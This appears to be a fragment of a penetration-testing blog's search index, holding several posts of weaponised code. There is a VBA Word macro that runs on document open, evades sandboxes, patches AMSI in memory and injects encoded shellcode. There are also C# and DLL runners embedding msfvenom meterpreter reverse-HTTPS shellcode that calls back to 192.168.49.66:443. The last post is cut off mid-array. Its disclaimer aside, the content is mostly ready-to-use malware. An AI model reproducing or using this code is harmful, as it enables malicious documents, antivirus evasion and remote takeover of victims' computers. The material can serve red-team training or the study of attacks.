40, 141, 116, 42, 51, 194, 174, 62, 99, 126, 4, 46, 34, 195, 209, 15, 3, 201, 75, 119, 241, 84, 141, 84, _18, 89, 141, 68, 62, 3, 210, 141, 66, 122, 135, 194, 118, 78, 3, 210, 82, 141, 90, 34, 141, 74, 26, 3, 213, 135, 203, 118, 62, 75, 51, 1, 141, 54, 141, 3, 216, 51, 194, 195, 209, 15, 174, 3, 201, 58, 226, 119, 246, 5, _127, 250, 61, 127, 38, 119, 226, 90, 141, 90, 38, 3, 213, 104, 141, 14, 77, 141, 90, 30, 3, 213, 141, 6, 141, 3, 210, 139, 70, 38, 38, 93, 93, 99, 91, 92, 83, 1, 226, 90, 97, 92, 141, 20, 235, 130, 1, 1, 1, 95, _106, 112, 103, 118, 2, 106, 121, 107, 112, 107, 86, 106, 78, 121, 40, 9, 1, 215, 51, 221, 85, 85, 85, 85, 85, 234, 64, 2, 2, 2, 79, 113, 124, 107, 110, 110, 99, 49, 55, 48, 50, 34, 42, 89, 107, 112, 102, 113, 121, 117, _34, 80, 86, 34, 56, 48, 51, 61, 34, 86, 116, 107, 102, 103, 112, 118, 49, 57, 48, 50, 61, 34, 116, 120, 60, 51, 51, 48, 50, 43, 34, 110, 107, 109, 103, 34, 73, 103, 101, 109, 113, 2, 106, 60, 88, 123, 169, 1, 215, 85, _85, 108, 5, 85, 85, 106, 189, 3, 2, 2, 234, 49, 3, 2, 2, 49, 47, 116, 82, 78, 70, 87, 124, 115, 84, 99, 84, 53, 92, 53, 92, 111, 72, 85, 121, 86, 108, 105, 101, 56, 69, 67, 85, 76, 82, 59, 83, 111, 59, 74, _89, 82, 78, 53, 55, 121, 112, 81, 70, 83, 109, 71, 102, 111, 58, 54, 78, 73, 86, 84, 67, 59, 121, 99, 53, 88, 58, 105, 97, 76, 67, 85, 119, 81, 81, 74, 83, 77, 115, 122, 92, 78, 105, 115, 91, 78, 103, 109, 85, 89, _105, 100, 83, 104, 80, 113, 83, 75, 52, 55, 117, 116, 81, 57, 55, 53, 80, 59, 73, 123, 113, 109, 76, 67, 109, 78, 80, 123, 90, 53, 118, 99, 116, 104, 56, 104, 51, 101, 108, 118, 72, 74, 111, 72, 116, 105, 67, 79, 76, 70, _55, 85, 71, 101, 99, 118, 110, 71, 69, 79, 111, 109, 105, 101, 115, 75, 111, 103, 47, 104, 112, 50, 56, 76, 2, 82, 106, 89, 139, 161, 200, 1, 215, 139, 200, 85, 106, 2, 52, 234, 134, 85, 85, 85, 89, 85, 88, 106, 237, 87, _48, 61, 1, 215, 152, 108, 12, 97, 106, 130, 53, 2, 2, 139, 226, 108, 6, 82, 108, 33, 88, 106, 119, 72, 160, 136, 1, 215, 85, 85, 85, 85, 88, 106, 47, 8, 26, 125, 1, 215, 135, 194, 119, 22, 106, 138, 21, 2, 2, 106, _70, 242, 55, 226, 1, 215, 81, 119, 207, 234, 76, 2, 2, 2, 108, 66, 106, 2, 18, 2, 2, 106, 2, 2, 66, 2, 85, 106, 90, 166, 85, 231, 1, 215, 149, 85, 85, 139, 233, 89, 106, 2, 34, 2, 2, 85, 88, 106, 20, 152, _139, 228, 1, 215, 135, 194, 118, 209, 141, 9, 3, 197, 135, 194, 119, 231, 90, 197, 97, 234, 109, 1, 1, 1, 51, 59, 52, 48, 51, 56, 58, 48, 54, 59, 48, 56, 56, 2, 189, 242, 183, 164, 88, 108, 2, 85, 1, 215)'decryption routineFor i = 0 To UBound(buf)\tbuf(i) = buf(i) - 2Next i\taddr = VirtualAlloc(0, UBound(buf), &amp;H3000, &amp;H40)\t\tFor counter = LBound(buf) To UBound(buf)\t\tdata = buf(counter)\t\tres = RtlMoveMemory(addr + counter, data, 1)\tNext counter\t\tres = CreateThread(0, 0, addr, 0, 0, 0)End FunctionSub Document_Open()\tMyMacroEnd SubSub AutoOpen()\tMyMacroEnd Subanother of my custom VBA runner with AMSI bypass abd other goodies read commentsType MODULEINFO  lpBaseOfDLL As Long  SizeOfImage As Long  EntryPoint As LongEnd TypePrivate Declare PtrSafe Function Sleep Lib \"KERNEL32\" (ByVal mili As Long) As LongPrivate Declare PtrSafe Function CreateThread Lib \"KERNEL32\" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtrPrivate Declare PtrSafe Function VirtualAlloc Lib \"KERNEL32\" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtrPrivate Declare PtrSafe Function GetPrAddr Lib \"KERNEL32\" Alias \"GetProcAddress\" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtrPrivate Declare PtrSafe Function VirtPro Lib \"KERNEL32\" Alias \"VirtualProtect\" (lpAddress As Any, ByVal dwSize As LongPtr, ByVal flNewProcess As LongPtr, lpflOldProtect As LongPtr) As LongPtrPrivate Declare PtrSafe Function getmod Lib \"KERNEL32\" Alias \"GetModuleHandleA\" (ByVal lpLibFileName As String) As LongPtrPrivate Declare PtrSafe Sub patched Lib \"KERNEL32\" Alias \"RtlFillMemory\" (Destination As Any, ByVal Length As Long, ByVal Fill As Byte)Public Declare PtrSafe Function EnumProcessModulesEx Lib \"psapi.dll\" (ByVal hProcess As LongPtr, lphModule As LongPtr, ByVal cb As LongPtr, lpcbNeeded As LongPtr, ByVal dwFilterFlag As LongPtr) As LongPtrPublic Declare PtrSafe Function GetModuleBaseName Lib \"psapi.dll\" Alias \"GetModuleBaseNameA\" (ByVal hProcess As LongPtr, ByVal hModule As LongPtr, ByVal lpFileName As String, ByVal nSize As LongPtr) As LongPtrFunction MyMacro() 'Get current time, sleep 4 seconds, get time again.  If less than 4 seconds have passed, assume we are in a AV sandbox and exit without running rest of macro. Dim myTime myTime = Time Dim Timein As Date Timein = Date + myTime Sleep (4000) Dim second_time second_time = Time Dim Timeout As Date Timeout = Date + second_time Dim subtime As Variant subtime = DateDiff(\"s\", Timein, Timeout) Dim vOut As Integer vOut = CInt(subtime) If subtime &lt; 3.5 Then    Exit Function End If 'initialize variables Dim Is64 As Boolean Dim StrFile As String Dim check As Boolean Dim buf As Variant Dim addr As LongPtr Dim counter As LongPtr Dim data As String Dim res As LongPtr Dim ipcheck As Boolean ipcheck = False Dim inscope As String 'define in scope IP's.  We can use wildcards here. inscope = \"192.168.*\" 'Call ip check function.  Returns True if machine IP is in scope. If True, pass.  If False, exit. ipcheck = getMyIP(inscope) If ipcheck Then Else    Exit Function End If 'Dynamically resolve amsi.dll StrFile = Dir(\"c:\\windows\\system32\\a?s?.d*\") 'Call architecture function to determine if we are in 32 bit or 64 bit word. 64 bit returns True. Is64 = arch() 'Call amsi check function to determine if amsi.dll is loaded into Word. This is the case in word 2019+. Returns True if Amsi is found. check = amcheck(StrFile) 'This portion to delete document body and replace with auto text (the \"legit\" content) 'ActiveDocument.Content.Select 'Selection.Delete 'ActiveDocument.AttachedTemplate.AutoTextEntries(\"TheDoc\").Insert Where:=Selection.Range, RichText:=True 'If amsi is found, call amsi patching function.  Pass architecture of Word as additional arg to function. If check Then     patch StrFile, Is64 End If 'Include shellcode for both x86 and x64. 'also no encryption routine on this shellcode, might have to look into something like xor or rot or caeser cipher to strengten it If Is64 Then    buf = Array(49, 125, 184, 25, 37, 29, 1, 53, 53, 53, 118, 134, 118, 133, 135, 125, 102, 7, 154, 125, 192, 135, 149, 125, 192, 135, 77, 125, 192, 135, 85, 134, 139, 125, 68, 236, 127, 127, 125, 192, 167, 133, 130, 102, 254, 125, 102, 245, 225, 113, _\t150, 177, 55, 97, 85, 118, 246, 254, 66, 118, 54, 246, 23, 34, 135, 125, 192, 135, 85, 118, 134, 192, 119, 113, 125, 54, 5, 155, 182, 173, 77, 64, 55, 68, 186, 167, 53, 53, 53, 192, 181, 189, 53, 53, 53, 125, 186, 245, 169, 156, _\t125, 54, 5, 133, 192, 125, 77, 121, 192, 117, 85, 126, 54, 5, 24, 139, 130, 102, 254, 125, 52, 254, 118, 192, 105, 189, 125, 54, 11, 125, 102, 245, 118, 246, 254, 66, 225, 118, 54, 246, 109, 21, 170, 38, 129, 56, 129, 89, 61, 122, _\t110, 6, 170, 13, 141, 121, 192, 117, 89, 126, 54, 5, 155, 118, 192, 65, 125, 121, 192, 117, 81, 126, 54, 5, 118, 192, 57, 189, 118, 141, 125, 54, 5, 118, 141, 147, 142, 143, 118, 141, 118, 142, 118, 143, 125, 184, 33, 85, 118, 135, _\t52, 21, 141, 118, 142, 143, 125, 192, 71, 30, 128, 52, 52, 52, 146, 125, 102, 16, 136, 126, 243, 172, 158, 163, 158, 163, 154, 169, 53, 118, 139, 125, 190, 22, 126, 252, 247, 129, 172, 91, 60, 52, 10, 136, 136, 125, 190, 22, 136, 143, _\t130, 102, 245, 130, 102, 254, 136, 136, 126, 239, 111, 139, 174, 220, 53, 53, 53, 53, 52, 10, 29, 67, 53, 53, 53, 102, 110, 103, 99, 102, 107, 109, 99, 105, 110, 99, 107, 107, 53, 143, 125, 190, 246, 126, 252, 245, 240, 54, 53, 53, _\t130, 102, 254, 136, 136, 159, 56, 136, 126, 239, 140, 190, 212, 251, 53, 53, 53, 53, 52, 10, 29, 8, 53, 53, 53, 100, 120, 161, 155, 101, 109, 138, 157, 148, 121, 130, 150, 169, 119, 107, 172, 123, 175, 101, 171, 125, 137, 134, 173, 151, _\t155, 125, 124, 119, 108, 175, 148, 142, 161, 133, 119, 106, 134, 127, 106, 106, 134, 136, 134, 138, 170, 109, 158, 132, 131, 109, 153, 154, 105, 137, 165, 125, 124, 163, 125, 143, 159, 155, 128, 150, 158, 164, 133, 109, 121, 160, 129, 135, 134, 157, _\t124, 120, 105, 139, 106, 163, 164, 128, 158, 156, 143, 165, 158, 141, 150, 166, 136, 109, 148, 162, 142, 124, 142, 109, 155, 153, 173, 174, 98, 109, 148, 159, 142, 135, 106, 125, 150, 167, 130, 143, 167, 152, 141, 119, 134, 132, 124, 167, 102, 162, _\t159, 160, 123, 126, 169, 163, 110, 131, 107, 155, 159, 109, 103, 165, 153, 168, 174, 138, 161, 105, 109, 165, 105, 142, 163, 98, 158, 173, 173, 162, 172, 125, 133, 164, 170, 107, 173, 139, 155, 153, 160, 162, 122, 170, 125, 168, 122, 137, 133, 157, _\t158, 155, 123, 158, 167, 133, 135, 175, 170, 134, 107, 156, 150, 121, 165, 133, 168, 155, 119, 148, 131, 132, 102, 106, 126, 165, 125, 110, 160, 120, 150, 134, 125, 157, 142, 53, 125, 190, 246, 136, 143, 118, 141, 130, 102, 254, 136, 125, 237, 53, _\t103, 221, 185, 53, 53, 53, 53, 133, 136, 136, 126, 252, 247, 32, 138, 99, 112, 52, 10, 125, 190, 251, 159, 63, 148, 125, 190, 38, 159, 84, 143, 135, 157, 181, 104, 53, 53, 126, 190, 21, 159, 57, 118, 142, 126, 239, 170, 123, 211, 187, _\t53, 53, 53, 53, 52, 10, 130, 102, 245, 136, 143, 125, 190, 38, 130, 102, 254, 130, 102, 254, 136, 136, 126, 252, 247, 98, 59, 77, 176, 52, 10, 186, 245, 170, 84, 125, 252, 246, 189, 72, 53, 53, 126, 239, 121, 37, 106, 21, 53, 53, _\t53, 53, 52, 10, 125, 52, 4, 169, 55, 32, 223, 29, 138, 53, 53, 53, 136, 142, 159, 117, 143, 126, 190, 6, 246, 23, 69, 126, 252, 245, 53, 69, 53, 53, 126, 239, 141, 217, 136, 26, 53, 53, 53, 53, 52, 10, 125, 200, 136, 136, _\t125, 190, 28, 125, 190, 38, 125, 190, 15, 126, 252, 245, 53, 85, 53, 53, 126, 190, 46, 126, 239, 71, 203, 190, 23, 53, 53, 53, 53, 52, 10, 125, 184, 249, 85, 186, 245, 169, 231, 155, 192, 60, 125, 54, 248, 186, 245, 170, 7, 141, _\t248, 141, 159, 53, 142, 126, 252, 247, 37, 234, 215, 139, 52, 10) Else    buf = Array(49, 29, 196, 53, 53, 53, 149, 102, 7, 190, 26, 153, 192, 135, 101, 192, 135, 65, 192, 135, 73, 68, 236, 127, 91, 102, 52, 192, 167, 93, 102, 245, 225, 113, 150, 177, 55, 97, 85, 246, 4, 66, 54, 252, 126, 170, 36, 135, 140, 192, _\t135, 69, 192, 119, 113, 54, 5, 192, 117, 173, 186, 245, 169, 129, 54, 5, 133, 192, 125, 77, 192, 141, 85, 54, 8, 186, 254, 169, 113, 102, 52, 126, 192, 105, 192, 54, 11, 102, 245, 246, 4, 66, 225, 54, 252, 109, 21, 170, 41, 56, _\t178, 45, 112, 178, 89, 170, 21, 141, 192, 141, 89, 54, 8, 155, 192, 65, 128, 192, 141, 81, 54, 8, 192, 57, 192, 54, 5, 190, 121, 89, 89, 144, 144, 150, 142, 143, 134, 52, 21, 141, 148, 143, 192, 71, 30, 181, 52, 52, 52, 146, _\t157, 163, 154, 169, 53, 157, 172, 158, 163, 158, 137, 157, 129, 172, 91, 60, 52, 10, 102, 16, 136, 136, 136, 136, 136, 29, 115, 53, 53, 53, 130, 164, 175, 158, 161, 161, 150, 100, 106, 99, 101, 85, 93, 140, 158, 163, 153, 164, 172, 168, _\t85, 131, 137, 85, 107, 99, 102, 112, 85, 137, 167, 158, 153, 154, 163, 169, 100, 108, 99, 101, 112, 85, 167, 171, 111, 102, 102, 99, 101, 94, 85, 161, 158, 160, 154, 85, 124, 154, 152, 160, 164, 53, 157, 111, 139, 174, 220, 52, 10, 136, _\t136, 159, 56, 136, 136, 157, 240, 54, 53, 53, 29, 7, 53, 53, 53, 100, 168, 161, 122, 121, 122, 122, 153, 158, 102, 106, 125, 170, 109, 98, 148, 174, 159, 129, 98, 108, 151, 118, 155, 110, 140, 109, 164, 140, 154, 135, 104, 132, 134, 128, _\t101, 166, 159, 150, 142, 162, 154, 173, 124, 137, 126, 143, 151, 150, 160, 150, 151, 130, 141, 108, 129, 127, 156, 134, 98, 153, 138, 153, 124, 168, 128, 53, 133, 157, 140, 190, 212, 251, 52, 10, 190, 251, 136, 157, 53, 103, 29, 185, 136, 136, _\t136, 140, 136, 139, 157, 32, 138, 99, 112, 52, 10, 203, 159, 63, 148, 157, 181, 104, 53, 53, 190, 21, 159, 57, 133, 159, 84, 139, 157, 170, 123, 211, 187, 52, 10, 136, 136, 136, 136, 139, 157, 98, 59, 77, 176, 52, 10, 186, 245, 170, _\t73, 157, 189, 72, 53, 53, 157, 121, 37, 106, 21, 52, 10, 132, 170, 2, 29, 127, 53, 53, 53, 159, 117, 157, 53, 69, 53, 53, 157, 53, 53, 117, 53, 136, 157, 141, 217, 136, 26, 52, 10, 200, 136, 136, 190, 28, 140, 157, 53, 85, _\t53, 53, 136, 139, 157, 71, 203, 190, 23, 52, 10, 186, 245, 169, 4, 192, 60, 54, 248, 186, 245, 170, 26, 141, 248, 148, 29, 160, 52, 52, 52, 102, 110, 103, 99, 102, 107, 109, 99, 105, 110, 99, 107, 107, 53, 240, 37, 234, 215, 139, _\t159, 53, 136, 52, 10)End If'Create new space in memory within current process addr = VirtualAlloc(0, UBound(buf), &amp;H3000, &amp;H40) 'Copy shellcode to newly created memory For counter = LBound(buf) To UBound(buf) data = Hex(buf(counter)) patched ByVal (addr + counter), 1, ByVal (\"&amp;H\" &amp; data) Next counter 'create thread to execute shellcode res = CreateThread(0, 0, addr, 0, 0, 0)End Function Function arch() As Boolean 'check architecture of current word process    #If Win64 Then        arch = True    #Else        arch = False    #End IfEnd FunctionPublic Function getMyIP(ipcheck As String) As Boolean'uses WMI to get all IP's associated with machine.  Each one is then checked against the wildcarded IP/network.  If a match is found, returns True    Dim objWMI As Object    Dim objQuery As Object    Dim objQueryItem As Object    Dim vIpAddress    Dim counter As Integer    Dim ips() As String    Set objWMI = GetObject(\"winmgmts:\\\\.\\root\\cimv2\")    Set objQuery = objWMI.ExecQuery(\"Select * from Win32_NetworkAdapterConfiguration Where IPEnabled = True\")    For Each objQueryItem In objQuery        For Each vIpAddress In objQueryItem.ipaddress            If CStr(vIpAddress) Like ipcheck Then                getMyIP = True            End If        Next    NextEnd FunctionFunction amcheck(StrFile As String) As Boolean'Checks for amsi.dll in word process. If found, returns TrueDim szProcessName As StringDim mdi As MODULEINFODim hMod(0 To 1023) As LongPtrDim res As LongPtramcheck = Falseres = EnumProcessModulesEx(-1, hMod(0), 1024, cbNeeded, &amp;H3)For i = 0 To UBound(hMod)    szProcessName = String$(50, 0)    GetModuleBaseName -1, hMod(i), szProcessName, Len(szProcessName)    If Left(szProcessName, 8) = StrFile Then        amcheck = True   End IfNext iEnd FunctionFunction patch(StrFile As String, Is64 As Boolean)'patches amsi.dll in memory in order to disable it.  Loads memory address of amsi.dll and then locates the AmsiUacInitialize function within it.  The AmsiScanBuffer and AmsiScanString functions are located via relative offset from AmsiUacInitialize and then overwritten with a nop and then a ret to disable them. ' Depending on architecture these offsets vary, so a case is included for x86 and x64Dim lib As LongPtrDim Func_addr As LongPtrDim temp As LongPtrDim old As LongPtrDim off As Integerlib = getmod(StrFile)If Is64 Then    off = 96Else    off = 80End IfFunc_addr = GetPrAddr(lib, \"Am\" &amp; Chr(115) &amp; Chr(105) &amp; \"U\" &amp; Chr(97) &amp; \"c\" &amp; \"Init\" &amp; Chr(105) &amp; Chr(97) &amp; \"lize\") - offtemp = VirtPro(ByVal Func_addr, 32, 64, 0)patched ByVal (Func_addr), 1, ByVal (\"&amp;H\" &amp; \"90\")patched ByVal (Func_addr + 1), 1, ByVal (\"&amp;H\" &amp; \"C3\")temp = VirtPro(ByVal Func_addr, 32, old, 0)If Is64 Then    off = 352Else    off = 256End IfFunc_addr = GetPrAddr(lib, \"Am\" &amp; Chr(115) &amp; Chr(105) &amp; \"U\" &amp; Chr(97) &amp; \"c\" &amp; \"Init\" &amp; Chr(105) &amp; Chr(97) &amp; \"lize\") - offtemp = VirtPro(ByVal Func_addr, 32, 64, old)patched ByVal (Func_addr), 1, ByVal (\"&amp;H\" &amp; \"90\")patched ByVal (Func_addr + 1), 1, ByVal (\"&amp;H\" &amp; \"C3\")temp = VirtPro(ByVal Func_addr, 32, old, 0)End Function'macro name is test which calls the main methodSub test() MyMacroEnd SubSub AutoOpen()    MyMacroEnd SubSub Document_Open()    MyMacroEnd Sub",
        "url": "/xdev/vbarunner/"
      }
      ,
    
      "xdev-dotnet2jscript": {
        "title": "C# -&gt; JScript + HTML Smug RatAttack",
        "author": "",
        "category": "",
        "content": "All exploits are written my myself and are for educational purposes only, i would not be liable for any misuse!###Shellcode runner to Jscript this works well with HTML smuggling attack, would add more information and update when i get the time```csharpusing System.Diagnostics;using System.Runtime.InteropServices;using System.Windows.Forms;using System;[ComVisible(true)]public class TestClass{    [DllImport(“kernel32”)]    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32\", CharSet = CharSet.Ansi)]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"kernel32.dll\", SetLastError = true)]static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);public TestClass(){        // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.66 LPORT=443 -f csharp    byte[] buf = new byte[679] {        0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,        0x51,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x56,0x48,0x8b,0x52,0x18,0x48,        0x8b,0x52,0x20,0x4d,0x31,0xc9,0x48,0x0f,0xb7,0x4a,0x4a,0x48,0x8b,0x72,0x50,        0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,        0x01,0xc1,0xe2,0xed,0x52,0x48,0x8b,0x52,0x20,0x41,0x51,0x8b,0x42,0x3c,0x48,        0x01,0xd0,0x66,0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,        0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x44,0x8b,        0x40,0x20,0x50,0x49,0x01,0xd0,0x8b,0x48,0x18,0xe3,0x56,0x48,0xff,0xc9,0x4d,        0x31,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x48,0x31,0xc0,0x41,0xc1,0xc9,        0x0d,0xac,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,        0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,        0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x41,0x58,        0x48,0x01,0xd0,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,        0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,        0x4b,0xff,0xff,0xff,0x5d,0x48,0x31,0xdb,0x53,0x49,0xbe,0x77,0x69,0x6e,0x69,        0x6e,0x65,0x74,0x00,0x41,0x56,0x48,0x89,0xe1,0x49,0xc7,0xc2,0x4c,0x77,0x26,        0x07,0xff,0xd5,0x53,0x53,0x48,0x89,0xe1,0x53,0x5a,0x4d,0x31,0xc0,0x4d,0x31,        0xc9,0x53,0x53,0x49,0xba,0x3a,0x56,0x79,0xa7,0x00,0x00,0x00,0x00,0xff,0xd5,        0xe8,0x0e,0x00,0x00,0x00,0x31,0x39,0x32,0x2e,0x31,0x36,0x38,0x2e,0x34,0x39,        0x2e,0x36,0x36,0x00,0x5a,0x48,0x89,0xc1,0x49,0xc7,0xc0,0xbb,0x01,0x00,0x00,        0x4d,0x31,0xc9,0x53,0x53,0x6a,0x03,0x53,0x49,0xba,0x57,0x89,0x9f,0xc6,0x00,        0x00,0x00,0x00,0xff,0xd5,0xe8,0x7e,0x00,0x00,0x00,0x2f,0x4b,0x65,0x70,0x39,        0x73,0x53,0x2d,0x50,0x45,0x56,0x51,0x66,0x2d,0x78,0x37,0x35,0x66,0x65,0x30,        0x7a,0x75,0x51,0x55,0x4e,0x43,0x6e,0x52,0x35,0x32,0x79,0x48,0x54,0x57,0x4d,        0x50,0x65,0x51,0x61,0x33,0x69,0x62,0x66,0x35,0x4f,0x4f,0x57,0x52,0x79,0x56,        0x7a,0x38,0x78,0x73,0x65,0x65,0x53,0x74,0x46,0x45,0x33,0x46,0x36,0x68,0x73,        0x6a,0x54,0x5a,0x44,0x6e,0x61,0x4c,0x51,0x56,0x51,0x4d,0x5a,0x71,0x6f,0x41,        0x77,0x6d,0x69,0x33,0x39,0x6b,0x41,0x43,0x74,0x69,0x30,0x45,0x6b,0x6c,0x61,        0x42,0x6e,0x4e,0x61,0x6f,0x36,0x48,0x68,0x35,0x4e,0x55,0x79,0x72,0x53,0x62,        0x41,0x4e,0x5a,0x6b,0x48,0x30,0x44,0x42,0x61,0x39,0x63,0x63,0x34,0x42,0x46,        0x00,0x48,0x89,0xc1,0x53,0x5a,0x41,0x58,0x4d,0x31,0xc9,0x53,0x48,0xb8,0x00,        0x32,0xa8,0x84,0x00,0x00,0x00,0x00,0x50,0x53,0x53,0x49,0xc7,0xc2,0xeb,0x55,        0x2e,0x3b,0xff,0xd5,0x48,0x89,0xc6,0x6a,0x0a,0x5f,0x48,0x89,0xf1,0x6a,0x1f,        0x5a,0x52,0x68,0x80,0x33,0x00,0x00,0x49,0x89,0xe0,0x6a,0x04,0x41,0x59,0x49,        0xba,0x75,0x46,0x9e,0x86,0x00,0x00,0x00,0x00,0xff,0xd5,0x4d,0x31,0xc0,0x53,        0x5a,0x48,0x89,0xf1,0x4d,0x31,0xc9,0x4d,0x31,0xc9,0x53,0x53,0x49,0xc7,0xc2,        0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x1f,0x48,0xc7,0xc1,0x88,0x13,        0x00,0x00,0x49,0xba,0x44,0xf0,0x35,0xe0,0x00,0x00,0x00,0x00,0xff,0xd5,0x48,        0xff,0xcf,0x74,0x02,0xeb,0xaa,0xe8,0x55,0x00,0x00,0x00,0x53,0x59,0x6a,0x40,        0x5a,0x49,0x89,0xd1,0xc1,0xe2,0x10,0x49,0xc7,0xc0,0x00,0x10,0x00,0x00,0x49,        0xba,0x58,0xa4,0x53,0xe5,0x00,0x00,0x00,0x00,0xff,0xd5,0x48,0x93,0x53,0x53,        0x48,0x89,0xe7,0x48,0x89,0xf1,0x48,0x89,0xda,0x49,0xc7,0xc0,0x00,0x20,0x00,        0x00,0x49,0x89,0xf9,0x49,0xba,0x12,0x96,0x89,0xe2,0x00,0x00,0x00,0x00,0xff,        0xd5,0x48,0x83,0xc4,0x20,0x85,0xc0,0x74,0xb2,0x66,0x8b,0x07,0x48,0x01,0xc3,        0x85,0xc0,0x75,0xd2,0x58,0xc3,0x58,0x6a,0x00,0x59,0x49,0xc7,0xc2,0xf0,0xb5,        0xa2,0x56,0xff,0xd5 };    int size = buf.Length;    IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);    Marshal.Copy(buf, 0, addr, size);    IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);    WaitForSingleObject(hThread, 0xFFFFFFFF);}public void RunProcess(string path){    Process.Start(path);} }```",
        "url": "/xdev/dotnet2jscript/"
      }
      ,
    
      "lab-cybernetics": {
        "title": "HackTheBox - Cybernetics",
        "author": "",
        "category": "",
        "content": "###Cybernetics lab from HTBi already compromised some host here, write up coming soon",
        "url": "/lab/cybernetics/"
      }
      ,
    
      "xdev-dllrefload": {
        "title": "ShellCode DLL + PS Reflective Load + Macro",
        "author": "",
        "category": "",
        "content": "All exploits are written my myself and are for educational purposes only, i would not be liable for any misuse!###DLL + Reflective Load DL Cradle + Macrousing System.Diagnostics;using System.Runtime.InteropServices;using System.Collections.Generic;using System.Threading.Tasks;using System.Linq;using System.Text;using System;namespace ClassLibrary1{    public class Class1    {        [DllImport(\"kernel32\")]        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);        [DllImport(\"kernel32\", CharSet = CharSet.Ansi)]        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,        IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);        [DllImport(\"kernel32.dll\", SetLastError = true)]        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);                        public static void runner()        {         DateTime t1 = DateTime.Now;        Sleep(2000);        double t2 = DateTime.Now.Subtract(t1).TotalSeconds;        if (t2 &lt; 1.5)        {            return;        }       // msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.49.66 LPORT=443  -f csharp             byte[] buf = new byte[557] {\t\t\t\t0xfc,0xe8,0x8f,0x00,0x00,0x00,0x60,0x31,0xd2,0x64,0x8b,0x52,0x30,0x89,0xe5,\t\t\t\t0x8b,0x52,0x0c,0x8b,0x52,0x14,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x8b,0x72,0x28,\t\t\t\t0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0x49,\t\t\t\t0x75,0xef,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,\t\t\t\t0x85,0xc0,0x74,0x4c,0x01,0xd0,0x8b,0x48,0x18,0x8b,0x58,0x20,0x50,0x01,0xd3,\t\t\t\t0x85,0xc9,0x74,0x3c,0x31,0xff,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xc0,0xc1,\t\t\t\t0xcf,0x0d,0xac,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,\t\t\t\t0x75,0xe0,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,\t\t\t\t0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,\t\t\t\t0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xe9,0x80,0xff,0xff,0xff,0x5d,\t\t\t\t0x68,0x6e,0x65,0x74,0x00,0x68,0x77,0x69,0x6e,0x69,0x54,0x68,0x4c,0x77,0x26,\t\t\t\t0x07,0xff,0xd5,0x31,0xdb,0x53,0x53,0x53,0x53,0x53,0xe8,0x3e,0x00,0x00,0x00,\t\t\t\t0x4d,0x6f,0x7a,0x69,0x6c,0x6c,0x61,0x2f,0x35,0x2e,0x30,0x20,0x28,0x57,0x69,\t\t\t\t0x6e,0x64,0x6f,0x77,0x73,0x20,0x4e,0x54,0x20,0x36,0x2e,0x31,0x3b,0x20,0x54,\t\t\t\t0x72,0x69,0x64,0x65,0x6e,0x74,0x2f,0x37,0x2e,0x30,0x3b,0x20,0x72,0x76,0x3a,\t\t\t\t0x31,0x31,0x2e,0x30,0x29,0x20,0x6c,0x69,0x6b,0x65,0x20,0x47,0x65,0x63,0x6b,\t\t\t\t0x6f,0x00,0x68,0x3a,0x56,0x79,0xa7,0xff,0xd5,0x53,0x53,0x6a,0x03,0x53,0x53,\t\t\t\t0x68,0xbb,0x01,0x00,0x00,0xe8,0x06,0x01,0x00,0x00,0x2f,0x34,0x32,0x73,0x72,\t\t\t\t0x5f,0x5f,0x79,0x4f,0x43,0x48,0x49,0x68,0x